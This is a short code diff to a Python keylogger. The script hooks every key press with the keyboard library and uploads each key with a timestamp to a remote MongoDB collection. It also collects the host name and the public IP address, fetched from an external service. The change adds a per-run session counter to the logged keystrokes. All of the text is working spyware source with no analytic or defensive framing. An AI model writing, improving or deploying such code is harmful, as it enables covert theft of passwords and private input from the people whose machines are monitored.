@@ -4,7 +4,7 @@ from datetime import datetime
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 
-uri = "<Your URI>"
+uri = ""
 client = MongoClient(uri, server_api=ServerApi('1'))
 
 id = ""
@@ -14,6 +14,7 @@ tt = datetime.fromtimestamp(datetime.timestamp(datetime.now()))
 system = {
     "_id" : (str(uuid.uuid4())+str(int(datetime.timestamp(datetime.now())))+str(randint(11111,99999))).replace('-',''),
     "timestamp" : f"{tt.hour}:{tt.minute}:{tt.second} - {tt.day}/{tt.month}/{tt.year}",
+    "session" : 0,
     "info": {
             "name" : socket.gethostname(),
             "ip" : requests.get('https://api.ipify.org').text,
@@ -32,9 +33,13 @@ if id == "":
     id = system["_id"]
     collection.insert_one(system)
 
+session = collection.find_one({"_id": id})
+collection.update_one({"_id": id}, {"$set": {"session" : session["session"]+1 }})
+print(session["session"])
+
 def log(event):
     global id; global data
-    data = {"key": event.name, "time": str(datetime.now())}
+    data = {"key": event.name, "session": session["session"]+1, "time": str(datetime.now())}
     collection.update_one({"_id": id}, {"$push": {"keys" : data}})
 
 keyboard.on_press(log)
